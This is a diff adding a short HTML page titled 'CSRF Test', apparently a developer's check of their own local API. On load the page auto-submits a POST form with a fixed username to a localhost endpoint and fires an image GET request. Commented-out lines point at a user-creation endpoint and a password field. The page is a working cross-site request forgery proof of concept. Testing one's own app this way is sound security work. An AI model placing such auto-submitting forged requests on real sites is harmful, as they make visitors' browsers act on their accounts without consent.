@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>CSRF Test</title>
+</head>
+<body onload="document.getElementById('f').submit()">
+	<img src="http://localhost:62020/api/v1/book/search?q=Harry&n=10" alt="">
+	<form id='f' method="POST" action="http://localhost:62020/api/v1/validUserName">
+	<!-- <form method="POST" action="http://localhost:62020/api/v1/user"> -->
+		<input type="text" name="username" value="varungupta3009">
+		<!-- <input type="text" name="password" value="000000aA"> -->
+		<input type="submit" value="Attack!">
+	</form>
+</body>
+</html>
